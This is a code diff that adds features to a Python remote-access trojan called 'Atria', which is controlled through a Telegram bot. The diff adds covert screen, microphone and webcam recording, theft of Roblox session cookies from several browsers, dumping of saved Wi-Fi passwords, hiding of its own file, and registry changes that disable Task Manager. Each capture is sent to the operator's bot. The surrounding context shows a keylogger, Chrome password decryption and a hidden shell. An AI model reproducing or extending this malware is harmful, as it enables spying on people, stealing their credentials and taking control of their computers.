@@ -12,16 +12,21 @@ import subprocess
 import sys
 import threading
 import time
+import wave
 import winreg
 
 # Third-party library imports, run "Install Atria.bat" to install modules via pip
 import keyboard
 import psutil
+import cv2
 import pyautogui
 import pyperclip
+import pyaudio
+import browser_cookie3
 import requests
 import telebot
 import win32crypt
+import numpy as np
 import pygetwindow as gw
 
 # Specific imports from modules, run "Install Atria.bat" to install modules via pip
@@ -120,11 +125,25 @@ def send_help(message):
         "Atria Commands\n"
         "/help - List available commands\n"
         "/screenshot - Capture and send a screenshot\n"
-        "/upload - Upload file from victim's PC\n"
-        "/download <filename> - Download file from victim's PC\n"
+        "/upload - Upload file from users's PC (not yet finished)\n"
+        "/download <filename> - Download file from user's PC\n"
         "/shell <command> - Execute commands using a hidden shell\n"
         "/users - Shows all users in the user's PC\n"
-        "/passwords - Decrypt passwords saved in Chrome and send to bot"
+        "/passwords - Decrypt passwords saved in Chrome and sends to the bot\n"
+        "/screenrecord <time in seconds> - Records the screen in x seconds\n"
+        "/hide - Hides the compiled python script using hidden attribute\n"
+        "/shutdown - Shuts down user's PC\n"
+        "/restart - Restarts user's PC\n"
+        "/tasklist - Shows running processes\n"
+        "taskkill - Kills specific processes\n"
+        "/mic <time in seconds> - Records mic audio in x seconds\n"
+        "/webscreenshot - Takes a picture in the webcam\n"
+        "/info - Shows currently PC info (ip address, etc)\n"
+        "/whoami - Shows the currently logged on user\n"
+        "/robloxcookie - Gets the roblox cookie and sends to the bot\n"
+        "/webcam <time in seconds> - Records the webcam in x seconds\n"
+        "/wifilist - Shows all saved wifi networks\n"
+        "/wifipass - Shows all wifi passwords for all saved wifi networks"
     )
     bot.send_message(message.chat.id, help_message)
 
@@ -347,6 +366,353 @@ def send_password_file(password_data, message):
     
     os.remove(file_path)
 
+# Records screen for specified duration
+@bot.message_handler(commands=['screenrecord'])
+def screen(message):
+    try:
+        params = message.text.split()
+        if len(params) != 2:
+            raise ValueError("Invalid number of parameters.")
+        record_time = int(params[1])
+    except (ValueError, IndexError):
+        bot.send_message(message.chat.id, 'Usage: /screenrecord <time in seconds>')
+        return
+
+    bot.send_message(message.chat.id, 'Please wait...')
+    
+    screen_width, screen_height = pyautogui.size()
+    filename = f'screen_record_{int(time.time())}.mkv'
+    fourcc = cv2.VideoWriter_fourcc(*'XVID')
+    output_video = cv2.VideoWriter(filename, fourcc, 10.0, (screen_width, screen_height))
+
+    start_time = time.time()
+
+    while True:
+        screenshot = pyautogui.screenshot()
+        frame = np.array(screenshot)
+        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+        output_video.write(frame)
+
+        if time.time() - start_time > record_time:
+            break
+
+    output_video.release()
+    cv2.destroyAllWindows()
+
+    try:
+        with open(filename, 'rb') as screenvideo:
+            bot.send_document(message.chat.id, screenvideo, timeout=300)
+    except Exception as e:
+        bot.send_message(message.chat.id, f'Error: {e}')
+    finally:
+        if os.path.exists(filename):
+            os.remove(filename)
+
+# Hides the compiled Python script
+@bot.message_handler(commands=['hide'])
+def hide(message):
+    try:
+        full_path = os.path.abspath(__file__)
+        bot.send_message(message.chat.id, f'Full path: {full_path}')
+        os.popen(f'attrib +h "{full_path}"')
+
+        bot.send_message(message.chat.id, 'Your app is now hidden!')
+    except Exception as e:
+        bot.send_message(message.chat.id, f'Error: {e}')
+
+# Shutdowns user's pc
+@bot.message_handler(commands=['shutdown'])
+def shutdown_command(message):
+    try:
+        os.popen('shutdown /s /f /t 0')
+        bot.send_message(message.chat.id, "PC is shutting down!")
+    except Exception as e:
+        bot.send_message(message.chat.id, f'Error: {e}')
+
+# Restarts user's pc
+@bot.message_handler(commands=['restart'])
+def restart_command(message):
+    try:
+        os.popen('shutdown /r /f /t 0')
+        bot.send_message(message.chat.id, "PC is restarting!")
+    except Exception as e:
+        bot.send_message(message.chat.id, f'Error: {e}')
+
+# Send tasklist and process descriptions
+@bot.message_handler(commands=['tasklist'])
+def command_execution(message):
+    try:
+        MAX_MESSAGE_LENGTH = 4096
+        
+        tasklist_res = os.popen('tasklist').read().strip()
+        tasklist_chunks = [tasklist_res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(tasklist_res), MAX_MESSAGE_LENGTH)]
+
+        for chunk in tasklist_chunks:
+            bot.send_message(message.chat.id, f"Tasklist Result:\n\n{chunk}")
+
+        wmic_res = os.popen('wmic process get description').read().strip()
+        wmic_chunks = [wmic_res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(wmic_res), MAX_MESSAGE_LENGTH)]
+
+        for chunk in wmic_chunks:
+            bot.send_message(message.chat.id, f"Process Descriptions:\n\n{chunk}")
+
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error:\n\n{e}")
+
+# Terminate a process by name or ID
+@bot.message_handler(commands=['taskkill'])
+def taskkill_command(message):
+    try:
+        command_params = message.text.split()
+
+        if len(command_params) < 2:
+            bot.send_message(message.chat.id, "Please provide the process name or ID. Example: /taskkill notepad.exe or /taskkill 1234")
+            return
+        
+        process = command_params[1]
+
+        taskkill_res = os.popen(f'taskkill /F /IM {process}').read().strip()
+        if 'No tasks' in taskkill_res:
+            taskkill_res = os.popen(f'taskkill /F /PID {process}').read().strip()
+
+        bot.send_message(message.chat.id, f"Taskkill Result:\n\n{taskkill_res}")
+        
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error:\n\n{e}")
+
+# Record and send audio for specified seconds
+@bot.message_handler(commands=['mic'])
+def record_audio(message):
+    default_record_time = 5
+    
+    try:
+        command_params = message.text.split()
+        if len(command_params) > 1:
+            record_time = int(command_params[1])
+        else:
+            record_time = default_record_time
+        
+        if record_time <= 0:
+            raise ValueError("Record time must be a positive number.")
+
+    except ValueError as e:
+        bot.reply_to(message, f"Invalid record time. Please enter a valid number. Error: {e}")
+        return
+
+    CHUNK = 1024
+    FORMAT = pyaudio.paInt16
+    CHANNELS = 2
+    RATE = 44100
+    WAVE_OUTPUT_FILENAME = "recorded_audio.wav"
+
+    p = pyaudio.PyAudio()
+    stream = p.open(format=FORMAT,
+                    channels=CHANNELS,
+                    rate=RATE,
+                    input=True,
+                    frames_per_buffer=CHUNK)
+
+    bot.send_message(message.chat.id, f"Recording audio for {record_time} seconds...")
+
+    frames = []
+    for _ in range(int(RATE / CHUNK * record_time)):
+        data = stream.read(CHUNK)
+        frames.append(data)
+
+    bot.send_message(message.chat.id, "Done recording, sending audio.")
+    stream.stop_stream()
+    stream.close()
+    p.terminate()
+
+    with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
+        wf.setnchannels(CHANNELS)
+        wf.setsampwidth(p.get_sample_size(FORMAT))
+        wf.setframerate(RATE)
+        wf.writeframes(b''.join(frames))
+
+    with open(WAVE_OUTPUT_FILENAME, 'rb') as audio_file:
+        bot.send_audio(message.chat.id, audio_file)
+
+    os.remove(WAVE_OUTPUT_FILENAME)
+
+# Capture and send a webcam photo
+@bot.message_handler(commands=['webscreenshot'])
+def take_photo(message):
+    try:
+        cap = cv2.VideoCapture(0)
+        
+        ret, frame = cap.read()
+        if not ret:
+            raise RuntimeError("Failed to capture image")
+
+        photo_path = 'photo.jpg'
+        cv2.imwrite(photo_path, frame)
+
+        with open(photo_path, 'rb') as photo:
+            bot.send_photo(message.chat.id, photo)
+
+        os.remove(photo_path)
+        cap.release()
+        
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error capturing photo: {e}")
+
+# Retrieve data from IPinfo API endpoint
+def fetch_ip_info(endpoint):
+    """Fetch IP info from a specified endpoint."""
+    return os.popen(f'curl ipinfo.io/{endpoint}').read().strip()
+
+# Send system and IP information
+@bot.message_handler(commands=['info'])
+def information(message):
+    try:
+        endpoints = {
+            'ip': 'IP',
+            'city': 'City',
+            'region': 'Region',
+            'country': 'Country',
+            'loc': 'Location',
+            'org': 'Provider',
+            'timezone': 'Timezone'
+        }
+
+        ip_info = "\n".join(f"{label}: {fetch_ip_info(endpoint)}" for endpoint, label in endpoints.items())
+        bot.send_message(message.chat.id, ip_info)
+
+        system_info = os.popen('wmic os get /format:list').read().strip()
+        bot.send_message(message.chat.id, f"\nSystem Information:\n{system_info}")
+
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}")
+
+# Show current user name
+@bot.message_handler(commands=['whoami'])
+def whoami_command(message):
+    try:
+        result = os.popen('whoami').read().strip()
+        bot.send_message(message.chat.id, f"User: {result}")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}")
+
+# Retrieve .ROBLOSECURITY cookie from various browsers
+def get_roblox_cookies():
+    """Retrieve Roblox cookies from various browsers."""
+    for browser in [browser_cookie3.chrome, browser_cookie3.brave, browser_cookie3.firefox,
+                    browser_cookie3.chromium, browser_cookie3.edge, browser_cookie3.opera]:
+        try:
+            cookies = browser(domain_name='roblox.com')
+            for cookie in cookies:
+                if cookie.name == '.ROBLOSECURITY':
+                    return cookie.value
+        except Exception:
+            continue
+    return None
+
+# Retrieve and send Roblox .ROBLOSECURITY cookie
+@bot.message_handler(commands=['robloxcookie'])
+def roblox(message):
+    try:
+        roblox_cookie = get_roblox_cookies()
+        
+        if roblox_cookie:
+            bot.send_message(message.chat.id, f'Security Cookie Value: {roblox_cookie}')
+            with open("roblox_cookie.txt", "w", encoding="utf-8") as file:
+                file.write(f'Security Cookie Value: {roblox_cookie}')
+            with open("roblox_cookie.txt", "rb") as file:
+                bot.send_document(message.chat.id, file)
+        else:
+            bot.send_message(message.chat.id, "No Roblox security cookie found.")
+    
+    except Exception as e:
+        bot.send_message(message.chat.id, f'Error: {e}')
+    
+    finally:
+        if os.path.exists('roblox_cookie.txt'):
+            os.remove('roblox_cookie.txt')
+
+# Record webcam video, specify time
+@bot.message_handler(commands=['webcam'])
+def webcam_command(message):
+    try:
+        params = message.text.split()
+        if len(params) != 2:
+            raise ValueError("Usage: /webcam <record_time>")
+        
+        record_time = int(params[1])
+        
+        msg = bot.send_message(message.chat.id, 'Enter camera index (0 for default, 1, etc.):')
+        bot.register_next_step_handler(msg, lambda msg: handle_camera_index(msg, record_time))
+    
+    except ValueError as e:
+        bot.send_message(message.chat.id, f'Error: {e}')
+    except Exception as e:
+        bot.send_message(message.chat.id, f'Error: {e}')
+
+# Process camera index and record video
+def handle_camera_index(message, record_time):
+    try:
+        camera_index = int(message.text)
+        
+        bot.send_message(message.chat.id, 'Recording... Please wait.')
+        record_video(message, camera_index, record_time)
+    
+    except ValueError:
+        bot.send_message(message.chat.id, 'Invalid camera index. Please enter a valid number.')
+    except Exception as e:
+        bot.send_message(message.chat.id, f'Error: {e}')
+
+# Record and send webcam video
+def record_video(message, camera_index, record_time):
+    output_file = 'webcam_recording.mkv'
+
+    try:
+        cap = cv2.VideoCapture(camera_index)
+        fourcc = cv2.VideoWriter_fourcc(*'XVID')
+        output_v = cv2.VideoWriter(output_file, fourcc, 20.0, (640, 480))
+        start_time = time.time()
+
+        while True:
+            ret, frame = cap.read()
+            if ret:
+                output_v.write(frame)
+                if time.time() - start_time > record_time:
+                    break
+            else:
+                break
+
+        cap.release()
+        output_v.release()
+        cv2.destroyAllWindows()
+
+        with open(output_file, 'rb') as video_file:
+            bot.send_document(message.chat.id, video_file, timeout=122)
+    
+    except Exception as e:
+        bot.send_message(message.chat.id, f'Error: {e}')
+
+    finally:
+        if os.path.exists(output_file):
+            os.remove(output_file)
+
+# List available WiFi networks
+@bot.message_handler(commands=['wifilist'])
+def list_wifi_profiles(message):
+    try:
+        wifi_list = os.popen('netsh wlan show profile').read().strip()
+        bot.send_message(message.chat.id, f'Available WiFi networks:\n{wifi_list}')
+    except Exception as e:
+        bot.send_message(message.chat.id, f'Error: {e}')
+
+# Get WiFi password info
+@bot.message_handler(commands=['wifipass'])
+def get_wifi_password(message):
+    try:
+        name = message.text.split('/wifipass', 1)[1].strip()
+        password_info = os.popen(f'netsh wlan show profile name="{name}" key=clear').read().strip()
+        bot.send_message(message.chat.id, f'WiFi Password Info:\n{password_info}')
+    except Exception as e:
+        bot.send_message(message.chat.id, f'Error: {e}')
+
 # Continuation of Keylogger Functions
 # Get path to Driver directory
 def get_app_dir():
@@ -471,6 +837,38 @@ def disable_uac():
     except FileNotFoundError:
         pass
 
+    winreg.CloseKey(reg_key)
+
+# Disable Task Manager by modifying registry
+def disable_task_manager():
+    try:
+        reg_key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ | winreg.KEY_WRITE)
+    except FileNotFoundError:
+        reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
+
+    try:
+        value, _ = winreg.QueryValueEx(reg_key, "DisableTaskMgr")
+
+        if value == 1:
+            print("Task Manager is already disabled.")
+        else:
+            command = r'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'
+            shell32 = ctypes.WinDLL('shell32', use_last_error=True)
+            ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
+            if ret < 32:
+                raise ctypes.WinError(ctypes.get_last_error())
+            else:
+                print("Task Manager has been disabled.")
+    except FileNotFoundError:
+        command = r'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'
+        shell32 = ctypes.WinDLL('shell32', use_last_error=True)
+        ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
+        if ret < 32:
+            raise ctypes.WinError(ctypes.get_last_error())
+        else:
+            print("Task Manager has been disabled.")
+    
+    # Close the registry key
     winreg.CloseKey(reg_key)
 
 # Check if a scheduled task exists
